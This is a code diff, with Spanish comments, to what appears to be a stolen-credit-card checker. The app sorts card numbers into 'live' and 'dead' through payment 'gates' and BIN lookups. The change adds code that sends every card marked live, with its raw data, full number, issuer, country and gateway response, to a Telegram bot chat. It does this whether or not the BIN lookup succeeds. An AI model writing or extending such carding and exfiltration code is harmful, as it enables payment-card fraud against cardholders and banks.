@@ -3,6 +3,8 @@ import { useUserStore } from './userStore'
 import { useLivesStore } from './livesStore'
 import { lookupBin } from '../services/binLookup'
 import { DEFAULT_GATE, type GateConfig } from '../config/gateCatalog'
+import { useTelegramStore } from '@/features/telegram/telegramStore'
+import { sendLiveCard } from '@/features/telegram/telegramService'
 
 export type CardStatus = 'live' | 'dead' | 'unknown'
 
@@ -226,9 +228,53 @@ export const useGateStore = create<GateState>((set, get) => ({
               country: info.countryName,
               countryEmoji: info.countryEmoji,
             })
+
+            // Telegram: envía la live card si está configurado
+            const tg = useTelegramStore.getState()
+            if (tg.enabled && tg.botToken && tg.chatId) {
+              const digits = number.replace(/\D/g, '')
+              sendLiveCard({
+                raw,
+                number,
+                bin: digits.slice(0, 6),
+                brand: info.brand ?? info.scheme?.toUpperCase() ?? 'Unknown',
+                bank: info.bankName ?? 'Unknown Issuer',
+                country: info.countryName ?? 'Unknown',
+                countryEmoji: info.countryEmoji ?? '',
+                cardType: info.type ?? 'Unknown',
+                cardCategory: [info.type, info.category].filter(Boolean).join(' · ') || 'Unknown',
+                gateName: get().gateName,
+                message,
+                checkedAt: Date.now(),
+              }, tg.botToken, tg.chatId).then((ok) => {
+                if (ok) useTelegramStore.getState().markSent()
+              })
+            }
           })
           .catch(() => {
             useLivesStore.getState().enrich(raw, {})
+
+            // Telegram: envía incluso sin BIN info
+            const tg = useTelegramStore.getState()
+            if (tg.enabled && tg.botToken && tg.chatId) {
+              const digits = number.replace(/\D/g, '')
+              sendLiveCard({
+                raw,
+                number,
+                bin: digits.slice(0, 6),
+                brand: 'Unknown',
+                bank: 'Unknown Issuer',
+                country: 'Unknown',
+                countryEmoji: '',
+                cardType: 'Unknown',
+                cardCategory: 'Unknown',
+                gateName: get().gateName,
+                message,
+                checkedAt: Date.now(),
+              }, tg.botToken, tg.chatId).then((ok) => {
+                if (ok) useTelegramStore.getState().markSent()
+              })
+            }
           })
       }
 
